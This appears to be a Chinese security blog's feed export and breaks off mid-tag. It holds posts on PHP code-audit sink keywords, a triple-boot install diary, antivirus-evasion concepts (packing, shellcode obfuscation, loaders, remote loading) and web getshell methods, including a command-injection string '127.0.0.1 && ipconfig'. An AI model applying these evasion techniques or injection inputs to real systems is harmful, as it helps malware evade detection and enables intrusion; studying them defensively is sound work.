title="1、逆向追踪"></a>1、逆向追踪</h2><p>逆向追踪，或叫回溯变量，一般是检查敏感函数的参数，然后回溯变量，判断变量是否可控并且没有经过严格的过滤，这是一个逆向追踪的过程。<br>优点：只需要搜索相应敏感关键字，即可以快速的挖掘想要的漏洞，具有可定向挖掘和高效优点。<br>缺点：由于没有通读代码，对程序的整体框架了解不够深入，在挖掘漏洞时定位利用点会花费一点时间，另外对逻辑漏洞挖掘覆盖不到。<br>##2、正向追踪<br>正向追踪，或叫跟踪变量<br>先找出那些文件在接收外部传入的参数，然后跟踪变量的传递过程，观察是否有变量传入到高危函数里面，或者传递的过程中是否有代码逻辑漏洞，这是一种正向追踪的方式。<br>优点：挖掘方式比逆向挖掘更全。<br>缺点：可能没有逆向追踪快<br>##3、直接挖掘功能点<br>根据自身的经验判断该类应用通常在哪些功能中会出现漏洞，直接阅读该部分功能代码。<br>优点：比较快速，准确<br>缺点：需要一定的经验，且可能会因为经验遗漏一点漏洞<br>##4、通读全文<br>一般<code>MVC</code>设计的网站 , 或者<strong>一些框架</strong> 适合这种审计方法 , 可能还需要结合一下<strong>断点调试</strong>技术<br>index 文件, index是一个程序的入口文件， 所以通常我们只要读一读index文件就可以大致了解整个程序的架构， 运行的流程， 包含的文件， 建议最好先将几个核心目录的index文件都简单读一遍<br>函数集文件， 一般在index文件中都会包含函数集文件， 通常命名为functions, common等关键字， 这些文件里面都是一些公共的函数， 提供给其他文件统一调用。<br>配置文件， 通常命名中包括 config 关键字，里面包含一些功能性配置选项以及数据库配置信息， 还可以注意下参数值是用单引号还是双引号， 如果是双引号， 则很可能会存在代码执行漏洞; 还需要关注以下数据库编码。<br>安全过滤文件， 文件过滤文件对我们做代码审计至关重要， 关系到我们挖掘到的可疑点能不能利用， 通常命名中有 filter, safe, check 等关键字， 这类文件主要是对参数进行过滤。<br>优点：可以更好的了解程序的架构以及业务逻辑，能够挖掘到更多，更高质量的逻辑漏洞。<br>缺点：花费的时间比较多，如果程序比较大，读起来会比较累。<br>&#x3D;&#x3D;个人更喜欢通读一下，但前提是对基础代码运行和架构框架有一定的的基础。&#x3D;&#x3D;<br>#四、漏洞产生的原因<br>1、配置不当，很多中间件框架都会有自己的配置文件，当配置文件中的某些设置配置不当时，很容易产生漏洞。<br>2、变量控制不严格 ，对前端传入的数据没有严格的过滤和限制。<br>3、变量到达有利用价值的函数，用户可以接触到这些变量并会被带入执行。<br>#五、漏洞关键字<br><strong>这就很多了。</strong><br>SQL：简单的增删改查关键词。<br>文件上传漏洞：<code>$_FILES</code> 、move_uploaded_file<br>命令执行漏洞关键字: shell_exec、exec、passthru ,  system 、popen<br>包含漏洞关键字: include、include_once、require、require_once<br>xss漏洞关键字: echo、print、print_r、var_dump、var_export<br>ssrf漏洞关键字: curl_exec 、file_get_contents、fsockopen<br>代码执行：主要由 eval()、assert()、preg_replace()、call_user_func()、call_user_func_array()、array_map()等函数的参数过滤不严格导致<br>命令执行：shell_exec、exec、passthru ,  system 、popen  </p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win+UOS+mac三系统折腾日记</title>
      <link href="/2021/12/18/mac_win_uos/"/>
      <url>/2021/12/18/mac_win_uos/</url>
      
        <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>本篇文章为本人第一篇在网上发表的个人记录文章，在过去的很长时间折腾过不少东西，但都没有记录，昨夜辗转反复，终有想法乍现，以此文章作为折腾记录的开篇。本篇文章仅适用于<strong>DELL G3 3579</strong>，极少或不涉及其他型号电脑的方法，极少或不普及相关基础知识，欢迎各位看客提出宝贵的建议和指导。</p><h1 id="二、本机配置"><a href="#二、本机配置" class="headerlink" title="二、本机配置"></a>二、本机配置</h1><p>首先贴出陪伴我三年风风雨雨，此篇文章折腾的对象机配置：<strong>DELL G3 3579</strong>，于2019年对此电脑升级，加装8gb内存条，512G SDD，2T机械硬盘，于2021年更换tigo512GB固态为西部数据SN550 1T。配置如下图所示：</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BZTVhZRw==,size_16,color_FFFFFF,t_70.png" alt="本机配置"></p><h1 id="三、黑苹果"><a href="#三、黑苹果" class="headerlink" title="三、黑苹果"></a>三、黑苹果</h1><h2 id="（一）关于黑苹果"><a href="#（一）关于黑苹果" class="headerlink" title="（一）关于黑苹果"></a>（一）关于黑苹果</h2><p>自从苹果采用<strong>Intel</strong>的处理器，OS X被黑客破解后可以安装在Intel CPU与<strong>部分AMD CPU</strong>的机器上。从而出现了一大批<strong>非苹果设备</strong>而使用苹果操作系统的机器，被称为黑苹果(Hackintosh)；在Mac苹果机上面安装原版Mac系统的被称为白苹果（Macintosh），与黑苹果相对。<br>第一次折腾黑苹果是在2020年2月，当时属实把我折腾够呛，遇到各种各样问题，逐步解决了一部分问题，遇到的问题会在三（三）中列出，并写出当时的解决方法。（我们都是站在巨人的肩膀）</p><h2 id="（二）安装黑苹果"><a href="#（二）安装黑苹果" class="headerlink" title="（二）安装黑苹果"></a>（二）安装黑苹果</h2><h3 id="1、准备阶段"><a href="#1、准备阶段" class="headerlink" title="1、准备阶段"></a>1、准备阶段</h3><ul><li>准备一个16GB的空U盘</li><li>准备一台正常运行并配备可以正常使用windows的电脑或笔记本</li><li>准备Transmac软件或者BalenaEtcher（本篇文章使用BalenaEtcher）</li><li>准备一个苹果系统镜像，后缀名为dmg（本篇文章使用dmg版，使用10.15.6版本）</li><li>准备好DiskGenius软件</li><li>最好准备一个带有PE系统的U盘启动盘（方便救急）</li><li>确定磁盘为GUID分区形式（如果是MBR，可用DiskGenius转换）</li><li>使用DiskGenius在目标磁盘建立一个ESP分区表（300mb，我给了2G）</li><li>使用DiskGenius在目标磁盘剩余部分新建分区，格式为MAC OS X AFTS（或许其他也可以）</li><li>准备好一双手，一个不怕麻烦，不怕折腾的大脑</li></ul><h3 id="2、制作Mac安装盘"><a href="#2、制作Mac安装盘" class="headerlink" title="2、制作Mac安装盘"></a>2、制作Mac安装盘</h3><ul><li>插入U盘</li><li>打开BalenaEtcher</li><li>点击Select image，选择你的Mac系统镜像文件</li><li>点击Select drive，选择你的U盘</li><li>点击Flash，等待完成<br>注意：安装过程不要触碰到或拔掉U盘，当Flash完成后windows会弹出：“需要格式化磁盘”，点击取消即可。</li></ul><h3 id="3、使用U盘安装Mac"><a href="#3、使用U盘安装Mac" class="headerlink" title="3、使用U盘安装Mac"></a>3、使用U盘安装Mac</h3><ul><li><p>将电脑关机或重启，关机状态或重启前将U盘插到电脑上</p></li><li><p>在出现DELL logo时，按下F12（大部分电脑主板是F12）</p></li><li><p>选择U盘的名字，按下回车Enter</p></li><li><p>此时会出现Clover（本篇文章使用四叶草引导）引导菜单</p></li><li><p>选择Boot mac from install mac（从U盘启动安装）</p></li><li><p>随后开启经典的跑代码模式（白底黑字）</p></li><li><p>当代码跑完后，会看到苹果logo，进入到实用工具</p></li><li><p>选择磁盘工具，单击要安装的目标磁盘，点击抹盘，这里格式我选的日志式</p></li><li><p>抹盘成功后返回实用工具，选择安装Mac，选择安装目标磁盘</p></li><li><p>安装过程大概需要20分钟左右，中途会自动重启两次<br> （一般来说，重启直接选择Boot install mac from 磁盘名）</p></li><li><p>当最后一次重启后，就可以看到选地区时区界面，黑苹果就安装成功了。</p></li><li><p>然后需要进入PE或windows下的DiskGenius，将U盘EFI文件夹下的所有文件全部拷贝到之前分出来的ESP下EFI文件夹中。</p></li><li><p>最后单击DiskGenius菜单栏中的工具，下拉菜单最后一项，UEFI启动项设置，新增一个启动项，自命名，选择启动文件为Cloverx64.efi，保存设置，拔掉U盘即可。</p></li></ul><h2 id="（三）遇到的问题"><a href="#（三）遇到的问题" class="headerlink" title="（三）遇到的问题"></a>（三）遇到的问题</h2><h3 id="1、安装过程出现禁止标志"><a href="#1、安装过程出现禁止标志" class="headerlink" title="1、安装过程出现禁止标志"></a>1、安装过程出现禁止标志</h3><p>请更换硬盘模式，详细请了解AHCI和RAID。</p><h3 id="2、跑代码卡在Please-go-to-report-this-panic"><a href="#2、跑代码卡在Please-go-to-report-this-panic" class="headerlink" title="2、跑代码卡在Please go  to report this panic"></a>2、跑代码卡在Please go  to report this panic</h3><p>话不多说，建议换EFI。</p><h3 id="3、显存只显示3mb或者7mb"><a href="#3、显存只显示3mb或者7mb" class="headerlink" title="3、显存只显示3mb或者7mb"></a>3、显存只显示3mb或者7mb</h3><p>显卡补丁问题，仿冒或者换设置。</p><h3 id="4、硬件无法驱动（正常使用）"><a href="#4、硬件无法驱动（正常使用）" class="headerlink" title="4、硬件无法驱动（正常使用）"></a>4、硬件无法驱动（正常使用）</h3><h3 id="5、安装过程读不到固态硬盘"><a href="#5、安装过程读不到固态硬盘" class="headerlink" title="5、安装过程读不到固态硬盘"></a>5、安装过程读不到固态硬盘</h3><p>请更换硬盘模式，详细请了解AHCI和RAID，这里还有一种情况，部分固态不支持。</p><h3 id="6、安装提示应用程序副本已损坏"><a href="#6、安装提示应用程序副本已损坏" class="headerlink" title="6、安装提示应用程序副本已损坏"></a>6、安装提示应用程序副本已损坏</h3><p>根据你所安装的mac系统去百度，进入终端修改时间即可。</p><h3 id="7、五国图卡eb-卡"><a href="#7、五国图卡eb-卡" class="headerlink" title="7、五国图卡eb(卡++++++)"></a>7、五国图卡eb(卡++++++)</h3><p>话不多说，建议换EFI。</p><h3 id="8、更换EFI后不引导（还是进入win）"><a href="#8、更换EFI后不引导（还是进入win）" class="headerlink" title="8、更换EFI后不引导（还是进入win）"></a>8、更换EFI后不引导（还是进入win）</h3><p>请检查启动选项是否自动恢复，随后重新设置，建议手动选择开机启动项。</p><h3 id="9、五国图acpi-eror"><a href="#9、五国图acpi-eror" class="headerlink" title="9、五国图acpi eror"></a>9、五国图acpi eror</h3><p>详细请了解AHCI和RAID，话不多说，建议换EFI。</p><h3 id="10、五国图直接黑屏"><a href="#10、五国图直接黑屏" class="headerlink" title="10、五国图直接黑屏"></a>10、五国图直接黑屏</h3><p>话不多说，建议换EFI。</p><h3 id="11、啰嗦模式跑完代码黑屏有声音"><a href="#11、啰嗦模式跑完代码黑屏有声音" class="headerlink" title="11、啰嗦模式跑完代码黑屏有声音"></a>11、啰嗦模式跑完代码黑屏有声音</h3><p>时间太久，我记得是显卡的问题，当然不是硬件问题，重启试试？我真这样解决过。</p><h3 id="12、五国图卡在HID-Legacy-shim-2"><a href="#12、五国图卡在HID-Legacy-shim-2" class="headerlink" title="12、五国图卡在HID Legacy shim 2"></a>12、五国图卡在HID Legacy shim 2</h3><p>话不多说，建议换EFI。</p><h3 id="13、clover更改配置不生效"><a href="#13、clover更改配置不生效" class="headerlink" title="13、clover更改配置不生效"></a>13、clover更改配置不生效</h3><p>请仔细检查现在所使用的clover是否为你更改的。</p><h3 id="14、驱动问题"><a href="#14、驱动问题" class="headerlink" title="14、驱动问题"></a>14、驱动问题</h3><p>驱动问题真是头疼，切记安装驱动的时候备份好。</p><h1 id="四、UOS统信"><a href="#四、UOS统信" class="headerlink" title="四、UOS统信"></a>四、UOS统信</h1><h2 id="（一）关于UOS统信"><a href="#（一）关于UOS统信" class="headerlink" title="（一）关于UOS统信"></a>（一）关于UOS统信</h2><p>统信UOS 是由包括中国电子集团、深度科技公司等发起的项目，全称为 Unity Operating System，是一款中文国产操作系统。是统信软件基于Linux5.3内核打造，专为个人用户推出的一款安全稳定、美观易用的桌面操作系统。</p><h2 id="（二）安装UOS统信"><a href="#（二）安装UOS统信" class="headerlink" title="（二）安装UOS统信"></a>（二）安装UOS统信</h2><h3 id="1、准备阶段-1"><a href="#1、准备阶段-1" class="headerlink" title="1、准备阶段"></a>1、准备阶段</h3><ul><li>准备一个16GB以上的U盘</li><li>准备统信UOS系统安装镜像</li><li>准备BalenaEther软件（本篇文章使用BalenaEther）</li><li>准备一台可以正常使用的电脑（此承接上一步，已安装好黑苹果）</li><li>将本机的512GB（实际477GB）固态卷压缩，压缩出一个200GB的空盘</li></ul><h3 id="2、制作UOS安装盘"><a href="#2、制作UOS安装盘" class="headerlink" title="2、制作UOS安装盘"></a>2、制作UOS安装盘</h3><pre><code>打开BalenaEther软件，选择U盘，选择镜像，点击Flash开始烧录U盘。</code></pre><h3 id="3、安装UOS系统"><a href="#3、安装UOS系统" class="headerlink" title="3、安装UOS系统"></a>3、安装UOS系统</h3><ul><li>烧录完成后，重启电脑，保持U盘插入状态，按F12（本机是F12）进入快速启动菜单，选择U盘名字，进入后选择第一个，install UOS。</li><li>进入欢迎界面，选好一些简单设置，进入分盘页面</li><li>分盘可以手动分盘，也可以自动分盘，但自动分盘会选择整个磁盘并且将磁盘完全变为UOS系统格式。</li><li>选择手动分盘（此文选择手动分盘），选择之前压缩出的200GB空盘，点击此盘右上角➕号标志，分出多个分区，EFI分区不用加载，UOS会自动读出之前的EFI，并把UOS系统加到ESP分区的EFI文件夹下。</li><li>分区情况：可以二分区，三分区，多分区。（本文采用多分区）新建&#x2F;boot分区（建议2GB），新建swap交换分区（建议本身运存*2，本文16GB），新建&#x2F;分区（根分区），主分区 起点 ext4（必须大于10GB），新建&#x2F;usr&#x2F;local分区（建议100GB），新建&#x2F;home分区（建议200GB），新建&#x2F;opt（看情况），新建&#x2F;recovery分区（备份分区，建议10GB）。</li><li>分区完成后进行下一步，等待一段时间后会重启，可以拔掉U盘，进入clover引导菜单，会看到多了UOS和乌班图以及linux，选择UOS进入（实测三个都会进入UOS），进入后设置一系列设置就可以进入桌面了。</li></ul><h2 id="（三）遇到的问题-1"><a href="#（三）遇到的问题-1" class="headerlink" title="（三）遇到的问题"></a>（三）遇到的问题</h2><h3 id="1、安装时读不到电脑固态"><a href="#1、安装时读不到电脑固态" class="headerlink" title="1、安装时读不到电脑固态"></a>1、安装时读不到电脑固态</h3><p>请详细了解AHCI和RAID，不妨换一下。</p><h3 id="2、如何手动分区"><a href="#2、如何手动分区" class="headerlink" title="2、如何手动分区"></a>2、如何手动分区</h3><p>参照上面手动分盘。</p><h3 id="3、其他输入法无法使用"><a href="#3、其他输入法无法使用" class="headerlink" title="3、其他输入法无法使用"></a>3、其他输入法无法使用</h3><p>建议百度，是可以解决的。</p><h3 id="4、设置中没有蓝牙选项"><a href="#4、设置中没有蓝牙选项" class="headerlink" title="4、设置中没有蓝牙选项"></a>4、设置中没有蓝牙选项</h3><p>重启你会发现有了，但偶尔也还会出现。</p><h1 id="五、Windows"><a href="#五、Windows" class="headerlink" title="五、Windows"></a>五、Windows</h1><h2 id="（一）关于Windows"><a href="#（一）关于Windows" class="headerlink" title="（一）关于Windows"></a>（一）关于Windows</h2><p>Microsoft Windows操作系统是美国微软公司研发的一套操作系统，它问世于1985年，起初仅仅是MS-DOS模拟环境，后续的系统版本由于微软不断的更新升级，不但易用，也成为了当前应用最广泛的操作系统。</p><h2 id="（二）安装Windows"><a href="#（二）安装Windows" class="headerlink" title="（二）安装Windows"></a>（二）安装Windows</h2><h3 id="1、准备阶段-2"><a href="#1、准备阶段-2" class="headerlink" title="1、准备阶段"></a>1、准备阶段</h3><ul><li>准备一个16GB的空U盘</li><li>准备好一个系统镜像（GHO可以去系统之家，推荐深度，setup可以去MSDN I tell you）</li><li>准备好PE启动盘制作软件（大白菜，老毛桃，U启动）</li><li>准备好一双手（一只也行），准备好一个不怕麻烦的大脑</li><li>准备好百度</li></ul><h3 id="2、制作PE启动盘"><a href="#2、制作PE启动盘" class="headerlink" title="2、制作PE启动盘"></a>2、制作PE启动盘</h3><ul><li>插入U盘，打开大白菜（本文使用大白菜）</li><li>选择HDD，ZIP适用于老电脑装XP</li><li>点击一键制作，然后等待完成，可以模拟测试一下</li></ul><h3 id="3、安装Windows"><a href="#3、安装Windows" class="headerlink" title="3、安装Windows"></a>3、安装Windows</h3><h4 id="（1）第一种方法：GHO镜像还原"><a href="#（1）第一种方法：GHO镜像还原" class="headerlink" title="（1）第一种方法：GHO镜像还原"></a>（1）第一种方法：GHO镜像还原</h4><p> 很老的方法，有时候也会出很多问题，如果你不用一键还原工具的话，希望你英语好。  </p><h4 id="（2）第二种方法：setup安装"><a href="#（2）第二种方法：setup安装" class="headerlink" title="（2）第二种方法：setup安装"></a>（2）第二种方法：setup安装</h4><p>用安装盘呗，不过也有两种方式，第一种是对于有完好win10的，可以从高级选项进入命令符模式，手动运行setup.exe，第二种是PE，不过有一部分概率会因为GUID和mbr报错，更换即可，也可能出现我们无法安装，建议百度，有极小概率无法解决。真的极小极小，不过你可以用GHO读文件夹中的镜像，也可以安装，不过算是简易安装。</p><h4 id="（3）总结"><a href="#（3）总结" class="headerlink" title="（3）总结"></a>（3）总结</h4><p>电脑么，程序么，有时候就是奇奇怪怪的，很多错误都可能会报同一个日志，多排错，逻辑清晰。</p><h1 id="六、三系统常见问题"><a href="#六、三系统常见问题" class="headerlink" title="六、三系统常见问题"></a>六、三系统常见问题</h1><h2 id="（一）双系统或三系统时间不正确"><a href="#（一）双系统或三系统时间不正确" class="headerlink" title="（一）双系统或三系统时间不正确"></a>（一）双系统或三系统时间不正确</h2><h2 id="（二）安装黑苹果后关机不断电，时间停留在上次关机时间"><a href="#（二）安装黑苹果后关机不断电，时间停留在上次关机时间" class="headerlink" title="（二）安装黑苹果后关机不断电，时间停留在上次关机时间"></a>（二）安装黑苹果后关机不断电，时间停留在上次关机时间</h2><p>这个问题当时困扰了我很久，换过cmos也没用，实际上很简单，如果你在百度上找到的方法没用，不妨制作一个linux安装盘，然后不要安装，选择从U盘体验，重启，你会发现个惊喜，或者装了统信卸载也可以。</p><h2 id="（三）clover引导菜单太多启动项"><a href="#（三）clover引导菜单太多启动项" class="headerlink" title="（三）clover引导菜单太多启动项"></a>（三）clover引导菜单太多启动项</h2><p>这个网上教程就很详细了，建议不要手动改，可能会变得不认识。</p><h2 id="（四）clover引导菜单倒计时只有五秒"><a href="#（四）clover引导菜单倒计时只有五秒" class="headerlink" title="（四）clover引导菜单倒计时只有五秒"></a>（四）clover引导菜单倒计时只有五秒</h2><p>参上。</p><h2 id="（五）clover引导更改主题"><a href="#（五）clover引导更改主题" class="headerlink" title="（五）clover引导更改主题"></a>（五）clover引导更改主题</h2><p>参上，记得安装几个插件，有两个插件提供服务。</p><h2 id="（六）clover引导换OC引导"><a href="#（六）clover引导换OC引导" class="headerlink" title="（六）clover引导换OC引导"></a>（六）clover引导换OC引导</h2><p>这个请对照其他详细教程，太久没印象了，记得挺简单的，包括之后的OC引导手动升级。</p><h1 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h1><p>第一篇文章，实际上在草稿箱躺了很久，以至于很多细节忘掉了，现在也换电脑了，新电脑目前还没有办法装黑果，请各位看官海涵，有什么问题可以评论，看到会回复的，在过程中也遇到了许许多多问题，踩到了很多的坑，感谢大家，一定要有一颗敢于折腾的心。</p>]]></content>
      
      
      <categories>
          
          <category> 折腾 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 折腾日记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀</title>
      <link href="/2021/12/13/do_not_kill/"/>
      <url>/2021/12/13/do_not_kill/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/01/40478ce850604072871e356b57943a83.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;注意：本篇文章仅用于学习以及笔记记录，不得用于其他违规用途。&#x3D;&#x3D;</p><h1 id="一、什么是免杀"><a href="#一、什么是免杀" class="headerlink" title="一、什么是免杀"></a>一、什么是免杀</h1><p>免杀，也就是病毒与反间谍的对立面，英文为Anti-AntiVirus（简写Virus AV），翻译为“反杀毒技术”。<br>这是一种能使病毒木马免于被杀毒软件查杀的技术。<br>&#x3D;&#x3D;由于免杀技术涉及到很多方面，包括反汇编、逆向工程、系统漏洞等技术，难度很高，所以本篇文章内容基本上都是修改病毒、木马的内容改变特征码，从而躲避杀毒软件的查杀。&#x3D;&#x3D;<br>#二、为什么有免杀<br>当我们在做安全测试的过程中，经常会自己编写一些脚本或者制作一些工具，其中用到的一些命令或者代码函数的特征已经被各大杀毒软件给识别到了自己的木马病毒库中，所以我们经常需要对自己编写的脚本或者工具进行免杀。<br>#三、常见的免杀方法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、加壳</span><br><span class="line"><span class="number">2</span>、ShellCode混淆，加密</span><br><span class="line"><span class="number">3</span>、各种语言的加载器</span><br><span class="line"><span class="number">4</span>、powershell混淆免杀</span><br><span class="line"><span class="number">5</span>、分离免杀（远程加载）shellcode和加载器不写在一个文件中，远程加载等。</span><br><span class="line"><span class="number">6</span>、白加黑（白名单程序执行恶意样本）</span><br><span class="line"><span class="number">7</span>、套接字免杀</span><br><span class="line"><span class="number">8</span>、使用一些免杀工具</span><br><span class="line"><span class="number">9</span>、自己写加载器</span><br><span class="line"><span class="number">10</span>、自己写远控</span><br></pre></td></tr></table></figure><h1 id="四、杀软介绍"><a href="#四、杀软介绍" class="headerlink" title="四、杀软介绍"></a>四、杀软介绍</h1><h2 id="1、杀软的基本原理"><a href="#1、杀软的基本原理" class="headerlink" title="1、杀软的基本原理"></a>1、杀软的基本原理</h2><p>常见的杀毒软件对程序的划分大致分为三种：<br><strong>无害</strong><br>没有任何的可疑行为，没有任何的特征符合病毒或木马<br><strong>可疑</strong><br>存在可疑行为：操作注册表，打开powershell，修改用户，操作敏感文件等<br><strong>存在病毒</strong><br>特征符合病毒或木马<br><strong>杀软常用识别恶意样本的方式</strong><br>静态查杀，动态查杀<br>##2、静态查杀<br><strong>特征码</strong><br>杀软会通过反编译的方式查看源代码，可以看到里面的一些函数和汇编代码<br>exe→函数→汇编<br>###（1）代码中的函数<br>virtualalloc，rtlmovememory，ntcreatthread等<br>主要都是windows api函数，尤其是和内存、堆、线程相关的函数，当然在python中如果存在cmd等关键词也是会被识别的。<br>危险函数，远控关键词（msf,conbalt strike）一些关键字（shellcode）<br>###（2）shellcode的特征<br><img src="http://120.48.107.243:9090/blog/2023/04/01/f5117f2c227c404db575f993a4e9081f.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/01/2e9eed31ca8545a8a0aa3ccdfd39c425.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/01/2e9226ba485b4cda91280390e1ee9bbc.png" alt="在这里插入图片描述"></p><p>以msf的shellcode举例，杀毒软件最常用的就是判断一部分的代码来识别，通常汇编层级下的代码要深入识别查杀堆杀毒软件来说有一定误判的风险，所以一般的杀毒引擎都是通过shellcode中的特征码来识别。<br>###（3）文件名和MD5<br>如果这个文件名使用了rlo翻转的话，无论是否是病毒都会直接杀，MD5值的话就是匹配样本库中的MD5值，看是否存在，这个一般都能规避掉。<br>###（4）加密（可疑）<br>使用加密解密行为对文件有额外保护措施<br>###（5）数字签名<br>判断当前程序的数字签名是否正常，可以使用签名伪造。<br>##3、动态查杀<br>通常这一步都是静态分析之后做的，部分杀毒软件会有沙盒，相当于开一个虚拟机运行一下恶意样本，看一下运行效果。<br>###（1）计算机相关<br>通常由r1或r2层挂监控的方式（类似于hook）当触发这些条件就会产生事件，例如：360会在系统的内核层对注册表和cmd进行监控，注册表的监控相对不那么严格，可以通过win32 api添加用户，通常杀软监控的有：<br>服务、注册表、组策略、放回去、敏感程序、用户敏感操作、敏感文件夹。<br>常见的绕过思路：替换方法，cmd用不了就用powershell（混淆，编码，加密），换函数api，或者用shellcode。<br>###（2）网络相关<br>IP，域名，证书匹配，查找通讯的IP活域名是否之前存在攻击行为<br>流量内容，事件特征，内容特征，结构特征。<br>常见的绕过思路：<br>TCP分段，内容加密，使用合法证书<br>##4、样本启动流程<br><img src="http://120.48.107.243:9090/blog/2023/04/01/7d58a6726d664bcd9f62c04fcc15e490.png" alt="在这里插入图片描述"></p><h1 id="五、具体姿势"><a href="#五、具体姿势" class="headerlink" title="五、具体姿势"></a>五、具体姿势</h1><h2 id="1、加壳"><a href="#1、加壳" class="headerlink" title="1、加壳"></a>1、加壳</h2><p>加壳的全称应该是可执行程序资源压缩，压缩后的程序可以直接运行。<br>加壳的另一种常用的方式是在二进制的程序中植入一段代码，在运行的时候优先取得程序的控制权，之后再把控制权交还给原始代码，这样做的目的是隐藏程序真正的OEP（入口点，防止被破解）。大多数病毒就是基于此原理。<br>加壳就是隐藏程序的入口文件。<br>通过对恶意样本的加壳处理，把原本的入口函数，再封装一层，让杀软无法找到我们程序的正常入口文件，进而躲避杀软分析我们的恶意样本，进而免杀。<br>##2、什么是shellcode<br>shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。<br>shellcode常常使用机器语言编写，可在暂存器eip溢出后，塞入一段可以让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。<br>shellcode就是能够执行命令的机器码，不是一个exe，常见的exe木马是可以脱离内存存在硬盘中的，但是shellcode不可以，他必须在内存中才可以运行。<br>为了方便阅读，大部分的shellcode都是16进制显示给用户的。<br>本质：二进制-16进制-汇编代码<br>msf和cs生成的raw格式的payload就是一个二进制格式的文件。<br>##3、shellcode加载器原理<br>shellcode加载器：简单来说，就是一个执行shellcode可执行文件。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/f7a8d8c9761449128789cf70b22e9736.png" alt="在这里插入图片描述"><br>加载器就是你用编程语言写出来的那个程序，shellcode是这个程序里面的一部分，在程序中就是一段字符，不能直接运行，而加载器的作用就是让他可以运行起来，最后shellcode执行后就是简历一个stager（建立目标和攻击者之间通信的道路，cs中的beacon指的就是stager)<br>常见加载器的主要功能<br>1、获取shellcode<br>2、virtualalloc函数申请内存<br>3、将shellcode载入内存<br>4、createthread函数创建新线程<br>5、等待创建的线程运行结束<br>&#x3D;&#x3D;为什么要有加载器？&#x3D;&#x3D;<br>默认情况下你的shellcode就是一堆字符，无法在内存中运行，所以需要加载器帮助他放到内存中运行，这也是加载器干的活。<br>&#x3D;&#x3D;本来想举例子，但想了想不放出来了。&#x3D;&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 安全知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 安全知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀</title>
      <link href="/2021/12/13/web_getshell_func/"/>
      <url>/2021/12/13/web_getshell_func/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/53963e2a9b684d9c92ea4048093934ac.png" alt="在这里插入图片描述"></p><p>PS：本篇文章仅用于学习笔记记录，不可用于其他用途。</p><h2 id="一、通用getshell方法"><a href="#一、通用getshell方法" class="headerlink" title="一、通用getshell方法"></a>一、通用getshell方法</h2><h3 id="1、任意文件上传"><a href="#1、任意文件上传" class="headerlink" title="1、任意文件上传"></a>1、任意文件上传</h3><p>（1）注意编程语言  asp , aspx , php , jsp<br>（2）上传成功 , 但是访问直接下载文件 , 以文本展示 , 原因 : 文件没有被解析<br>（3）上传成功 , 蚁剑链接失败 , 原因 : 可能是对方有防护措施 , 拦截蚁剑的流量 , 可以在浏览器上访问页面是否存在 , 是否解析<br>（4）一般在测试中 , 不推荐直接上传一句话 , 如 php , 上传 phpinfo , 测试是否解析即可<br>&#x3D;&#x3D;PS：一定不要混乱上传，保持头脑理智。&#x3D;&#x3D;<br><strong>实战中遇到的偏多</strong></p><h3 id="2、存在命令-x2F-代码执行的功能点"><a href="#2、存在命令-x2F-代码执行的功能点" class="headerlink" title="2、存在命令&#x2F;代码执行的功能点"></a>2、存在命令&#x2F;代码执行的功能点</h3><p>关于代码执行&#x2F;或者命令执行 , 这里也不过多介绍了 , 这里强调指的是在系统中自带存在的一些执行命令&#x2F;代码的功<br>能点 , 一般在网站后台存在 , 后面有案例演示 , 仍然是需要注意的点</p><ol><li>构造payload在原来的基础上实现任意命令的执行 , 比如 原本是 ping 127.0.0.1 , 构造<br>127.0.0.1 &amp;&amp; ipconfig , ipconfig 为任意命令<br><strong>实战中遇到的偏少</strong> , 很多业务系统后台不存在这样的功能点 , 但是一些设备的管理后台可能存在 , 如路由器管理等<br>案例演示<br><strong>dedecms&#x2F;织梦cms , 后台命令执行getshell</strong><br>环境搭建<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2021/zip/2942226/1640761153948-e2302869-fec2-4acb-967b-c0f04a2e4ec3.zip?OSSAccessKeyId=LTAI4GGhPJmQ4HWCmhDAn4F5&amp;Expires=1662538729&amp;Signature=IgGRNA6nX%2B0guPtcRVBTHgJjDHo%3D&amp;response-content-disposition=attachment%3Bfilename*%3DUTF-8%27%27DedeCMS-V5.7.82-UTF8.zip</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载好源码 , 解压到phpstudy www目录下</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PHP5.6 + mysql</span></span><br></pre></td></tr></table></figure>安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 